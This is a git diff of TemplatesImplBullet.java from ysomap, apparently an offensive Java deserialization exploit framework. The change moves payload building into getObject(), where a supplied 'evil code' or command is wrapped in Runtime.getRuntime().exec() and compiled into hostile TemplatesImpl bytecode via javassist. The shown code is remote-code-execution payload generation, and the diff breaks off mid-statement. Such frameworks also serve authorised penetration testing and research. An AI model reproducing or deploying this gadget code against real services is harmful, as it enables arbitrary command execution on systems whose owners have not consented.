@@ -11,8 +11,8 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
 import ysomap.util.ClassFiles;
-import ysomap.util.PayloadHelper;
 import ysomap.util.Reflections;
 
 import java.io.Serializable;
@@ -22,33 +22,27 @@ import java.io.Serializable;
  * @since 2020/2/17
  */
 @SuppressWarnings({"rawtypes"})
-@Dependencies({"set --args command"})
+@Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
 @Authors({ Authors.WH1T3P1G })
 public class TemplatesImplBullet extends Bullet<Object> {
 
     private Class templatesImpl;
     private Class abstractTranslet;
     private Class transformerFactoryImpl;
-    private String body;
 
-    public TemplatesImplBullet(String args) {
-        args = args == null? PayloadHelper.defaultTestCommand() : args;
-        if(args.startsWith("code:")){// code mode
-            this.body = args.substring(5);
-        }else{// system command execute mode
-            this.body = "java.lang.Runtime.getRuntime().exec(\"" +
-                    args.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-                    "\");";
-        }
-        try {
-            initClazz();
-        } catch (ClassNotFoundException e) {
-            e.printStackTrace();
-        }
-    }
+    @Require(name = "body" ,detail = "evil code (start with 'code:') or evil commands")
+    private String body;
 
     @Override
     public Object getObject() throws Exception {
+        if(body.startsWith("code:")){// code mode
+            body = body.substring(5);
+        }else{// system command execute mode
+            body = "java.lang.Runtime.getRuntime().exec(\"" +
+                    body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                    "\");";
+        }
+        initClazz();
         // create evil bytecodes
         ClassPool pool = ClassPool.getDefault();
         CtClass cc = ClassFiles.makeClassFromExistClass(pool,
